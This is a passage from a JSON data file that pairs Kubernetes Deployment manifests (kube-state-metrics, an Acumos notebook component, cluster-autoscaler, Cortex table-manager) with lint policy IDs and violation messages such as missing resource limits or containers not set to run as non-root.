80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-rbac-proxy-main\" has memory limit 0"
  },
  {
    "id": "9536",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-rbac-proxy-self\" has memory limit 0"
  },
  {
    "id": "9537",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-state-metrics\" has memory limit 0"
  },
  {
    "id": "9538",
    "manifest_path": "data/manifests/the_stack_sample/sample_3631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: mlwb-notebook-catalog-webcomponent\n  labels:\n    app: mlwb-notebook-catalog-webcomponent\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mlwb-notebook-catalog-webcomponent\n  template:\n    metadata:\n      labels:\n        app: mlwb-notebook-catalog-webcomponent\n        <ACUMOS_SERVICE_LABEL_KEY>: <MLWB_NOTEBOOK_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <MLWB_NOTEBOOK_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: mlwb-notebook-catalog-webcomponent\n        image: <MLWB_NOTEBOOK_CATALOG_WEBCOMPONENT_IMAGE>\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xms128m -Xmx256m\n        - name: ENVIRONMENT\n          value: deploy\n        - name: projectmSURL\n          value: http://mlwb-project-service:9088/mlWorkbench/v1/project\n        - name: notebookmSURL\n          value: http://mlwb-notebook-service:9089/mlWorkbench/v1/notebook\n        - name: pipelinemSURL\n          value: http://mlwb-pipeline-service:9090/mlWorkbench/v1/pipeline\n        - name: notebookWikiURL\n          value: https://wiki.acumos.org/display/TRAIN\n        - name: useExternalNotebook\n          value: <MLWB_JUPYTERHUB_EXTERNAL_NOTEBOOK_SERVICE>\n        ports:\n        - containerPort: 9087\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <MLWB_NOTEBOOK_SERVICE_LABEL>\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mlwb-notebook-catalog-webcomponent\" is using an invalid container image, \"<MLWB_NOTEBOOK_CATALOG_WEBCOMPONENT_IMAGE>\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9539",
    "manifest_path": "data/manifests/the_stack_sample/sample_3631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: mlwb-notebook-catalog-webcomponent\n  labels:\n    app: mlwb-notebook-catalog-webcomponent\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mlwb-notebook-catalog-webcomponent\n  template:\n    metadata:\n      labels:\n        app: mlwb-notebook-catalog-webcomponent\n        <ACUMOS_SERVICE_LABEL_KEY>: <MLWB_NOTEBOOK_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <MLWB_NOTEBOOK_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: mlwb-notebook-catalog-webcomponent\n        image: <MLWB_NOTEBOOK_CATALOG_WEBCOMPONENT_IMAGE>\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xms128m -Xmx256m\n        - name: ENVIRONMENT\n          value: deploy\n        - name: projectmSURL\n          value: http://mlwb-project-service:9088/mlWorkbench/v1/project\n        - name: notebookmSURL\n          value: http://mlwb-notebook-service:9089/mlWorkbench/v1/notebook\n        - name: pipelinemSURL\n          value: http://mlwb-pipeline-service:9090/mlWorkbench/v1/pipeline\n        - name: notebookWikiURL\n          value: https://wiki.acumos.org/display/TRAIN\n        - name: useExternalNotebook\n          value: <MLWB_JUPYTERHUB_EXTERNAL_NOTEBOOK_SERVICE>\n        ports:\n        - containerPort: 9087\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <MLWB_NOTEBOOK_SERVICE_LABEL>\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mlwb-notebook-catalog-webcomponent\" does not have a read-only root file system"
  },
  {
    "id": "9540",
    "manifest_path": "data/manifests/the_stack_sample/sample_3631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: mlwb-notebook-catalog-webcomponent\n  labels:\n    app: mlwb-notebook-catalog-webcomponent\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mlwb-notebook-catalog-webcomponent\n  template:\n    metadata:\n      labels:\n        app: mlwb-notebook-catalog-webcomponent\n        <ACUMOS_SERVICE_LABEL_KEY>: <MLWB_NOTEBOOK_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <MLWB_NOTEBOOK_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: mlwb-notebook-catalog-webcomponent\n        image: <MLWB_NOTEBOOK_CATALOG_WEBCOMPONENT_IMAGE>\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xms128m -Xmx256m\n        - name: ENVIRONMENT\n          value: deploy\n        - name: projectmSURL\n          value: http://mlwb-project-service:9088/mlWorkbench/v1/project\n        - name: notebookmSURL\n          value: http://mlwb-notebook-service:9089/mlWorkbench/v1/notebook\n        - name: pipelinemSURL\n          value: http://mlwb-pipeline-service:9090/mlWorkbench/v1/pipeline\n        - name: notebookWikiURL\n          value: https://wiki.acumos.org/display/TRAIN\n        - name: useExternalNotebook\n          value: <MLWB_JUPYTERHUB_EXTERNAL_NOTEBOOK_SERVICE>\n        ports:\n        - containerPort: 9087\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <MLWB_NOTEBOOK_SERVICE_LABEL>\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mlwb-notebook-catalog-webcomponent\" is not set to runAsNonRoot"
  },
  {
    "id": "9541",
    "manifest_path": "data/manifests/the_stack_sample/sample_3631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: mlwb-notebook-catalog-webcomponent\n  labels:\n    app: mlwb-notebook-catalog-webcomponent\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mlwb-notebook-catalog-webcomponent\n  template:\n    metadata:\n      labels:\n        app: mlwb-notebook-catalog-webcomponent\n        <ACUMOS_SERVICE_LABEL_KEY>: <MLWB_NOTEBOOK_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <MLWB_NOTEBOOK_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: mlwb-notebook-catalog-webcomponent\n        image: <MLWB_NOTEBOOK_CATALOG_WEBCOMPONENT_IMAGE>\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xms128m -Xmx256m\n        - name: ENVIRONMENT\n          value: deploy\n        - name: projectmSURL\n          value: http://mlwb-project-service:9088/mlWorkbench/v1/project\n        - name: notebookmSURL\n          value: http://mlwb-notebook-service:9089/mlWorkbench/v1/notebook\n        - name: pipelinemSURL\n          value: http://mlwb-pipeline-service:9090/mlWorkbench/v1/pipeline\n        - name: notebookWikiURL\n          value: https://wiki.acumos.org/display/TRAIN\n        - name: useExternalNotebook\n          value: <MLWB_JUPYTERHUB_EXTERNAL_NOTEBOOK_SERVICE>\n        ports:\n        - containerPort: 9087\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <MLWB_NOTEBOOK_SERVICE_LABEL>\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mlwb-notebook-catalog-webcomponent\" has cpu request 0"
  },
  {
    "id": "9542",
    "manifest_path": "data/manifests/the_stack_sample/sample_3631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: mlwb-notebook-catalog-webcomponent\n  labels:\n    app: mlwb-notebook-catalog-webcomponent\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mlwb-notebook-catalog-webcomponent\n  template:\n    metadata:\n      labels:\n        app: mlwb-notebook-catalog-webcomponent\n        <ACUMOS_SERVICE_LABEL_KEY>: <MLWB_NOTEBOOK_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <MLWB_NOTEBOOK_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: mlwb-notebook-catalog-webcomponent\n        image: <MLWB_NOTEBOOK_CATALOG_WEBCOMPONENT_IMAGE>\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xms128m -Xmx256m\n        - name: ENVIRONMENT\n          value: deploy\n        - name: projectmSURL\n          value: http://mlwb-project-service:9088/mlWorkbench/v1/project\n        - name: notebookmSURL\n          value: http://mlwb-notebook-service:9089/mlWorkbench/v1/notebook\n        - name: pipelinemSURL\n          value: http://mlwb-pipeline-service:9090/mlWorkbench/v1/pipeline\n        - name: notebookWikiURL\n          value: https://wiki.acumos.org/display/TRAIN\n        - name: useExternalNotebook\n          value: <MLWB_JUPYTERHUB_EXTERNAL_NOTEBOOK_SERVICE>\n        ports:\n        - containerPort: 9087\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <MLWB_NOTEBOOK_SERVICE_LABEL>\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mlwb-notebook-catalog-webcomponent\" has memory limit 0"
  },
  {
    "id": "9543",
    "manifest_path": "data/manifests/the_stack_sample/sample_3632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cluster-autoscaler\n  namespace: kube-system\n  labels:\n    app: cluster-autoscaler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cluster-autoscaler\n  template:\n    metadata:\n      namespace: kube-system\n      labels:\n        app: cluster-autoscaler\n    spec:\n      serviceAccountName: cluster-autoscaler-account\n      containers:\n      - name: cluster-autoscaler\n        image: thartland/magnum-autoscaler:v1.0\n        imagePullPolicy: Always\n        command:\n        - ./cluster-autoscaler\n        - --alsologtostderr\n        - --cluster-name=scaler-01\n        - --cloud-config=/config/cloud-config\n        - --cloud-provider=magnum\n        - --nodes=1:10:DefaultNodeGroup\n        volumeMounts:\n        - name: cloud-config\n          mountPath: /config\n          readOnly: true\n      volumes:\n      - name: cloud-config\n        secret:\n          secretName: cluster-autoscaler-cloud-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cluster-autoscaler\" does not have a read-only root file system"
  },
  {
    "id": "9544",
    "manifest_path": "data/manifests/the_stack_sample/sample_3632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cluster-autoscaler\n  namespace: kube-system\n  labels:\n    app: cluster-autoscaler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cluster-autoscaler\n  template:\n    metadata:\n      namespace: kube-system\n      labels:\n        app: cluster-autoscaler\n    spec:\n      serviceAccountName: cluster-autoscaler-account\n      containers:\n      - name: cluster-autoscaler\n        image: thartland/magnum-autoscaler:v1.0\n        imagePullPolicy: Always\n        command:\n        - ./cluster-autoscaler\n        - --alsologtostderr\n        - --cluster-name=scaler-01\n        - --cloud-config=/config/cloud-config\n        - --cloud-provider=magnum\n        - --nodes=1:10:DefaultNodeGroup\n        volumeMounts:\n        - name: cloud-config\n          mountPath: /config\n          readOnly: true\n      volumes:\n      - name: cloud-config\n        secret:\n          secretName: cluster-autoscaler-cloud-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"cluster-autoscaler-account\" not found"
  },
  {
    "id": "9545",
    "manifest_path": "data/manifests/the_stack_sample/sample_3632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cluster-autoscaler\n  namespace: kube-system\n  labels:\n    app: cluster-autoscaler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cluster-autoscaler\n  template:\n    metadata:\n      namespace: kube-system\n      labels:\n        app: cluster-autoscaler\n    spec:\n      serviceAccountName: cluster-autoscaler-account\n      containers:\n      - name: cluster-autoscaler\n        image: thartland/magnum-autoscaler:v1.0\n        imagePullPolicy: Always\n        command:\n        - ./cluster-autoscaler\n        - --alsologtostderr\n        - --cluster-name=scaler-01\n        - --cloud-config=/config/cloud-config\n        - --cloud-provider=magnum\n        - --nodes=1:10:DefaultNodeGroup\n        volumeMounts:\n        - name: cloud-config\n          mountPath: /config\n          readOnly: true\n      volumes:\n      - name: cloud-config\n        secret:\n          secretName: cluster-autoscaler-cloud-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cluster-autoscaler\" is not set to runAsNonRoot"
  },
  {
    "id": "9546",
    "manifest_path": "data/manifests/the_stack_sample/sample_3632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cluster-autoscaler\n  namespace: kube-system\n  labels:\n    app: cluster-autoscaler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cluster-autoscaler\n  template:\n    metadata:\n      namespace: kube-system\n      labels:\n        app: cluster-autoscaler\n    spec:\n      serviceAccountName: cluster-autoscaler-account\n      containers:\n      - name: cluster-autoscaler\n        image: thartland/magnum-autoscaler:v1.0\n        imagePullPolicy: Always\n        command:\n        - ./cluster-autoscaler\n        - --alsologtostderr\n        - --cluster-name=scaler-01\n        - --cloud-config=/config/cloud-config\n        - --cloud-provider=magnum\n        - --nodes=1:10:DefaultNodeGroup\n        volumeMounts:\n        - name: cloud-config\n          mountPath: /config\n          readOnly: true\n      volumes:\n      - name: cloud-config\n        secret:\n          secretName: cluster-autoscaler-cloud-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cluster-autoscaler\" has cpu request 0"
  },
  {
    "id": "9547",
    "manifest_path": "data/manifests/the_stack_sample/sample_3632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cluster-autoscaler\n  namespace: kube-system\n  labels:\n    app: cluster-autoscaler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cluster-autoscaler\n  template:\n    metadata:\n      namespace: kube-system\n      labels:\n        app: cluster-autoscaler\n    spec:\n      serviceAccountName: cluster-autoscaler-account\n      containers:\n      - name: cluster-autoscaler\n        image: thartland/magnum-autoscaler:v1.0\n        imagePullPolicy: Always\n        command:\n        - ./cluster-autoscaler\n        - --alsologtostderr\n        - --cluster-name=scaler-01\n        - --cloud-config=/config/cloud-config\n        - --cloud-provider=magnum\n        - --nodes=1:10:DefaultNodeGroup\n        volumeMounts:\n        - name: cloud-config\n          mountPath: /config\n          readOnly: true\n      volumes:\n      - name: cloud-config\n        secret:\n          secretName: cluster-autoscaler-cloud-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cluster-autoscaler\" has memory limit 0"
  },
  {
    "id": "9548",
    "manifest_path": "data/manifests/the_stack_sample/sample_3633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.2.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"table-manager\" does not have a read-only root file system"
  },
  {
    "id": "9549",
    "manifest_path": "data/manifests/the_stack_sample/sample_3633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.2.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"table-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "9550",
    "manifest_path": "data/manifests/the_stack_sample/sample_3633.yaml",
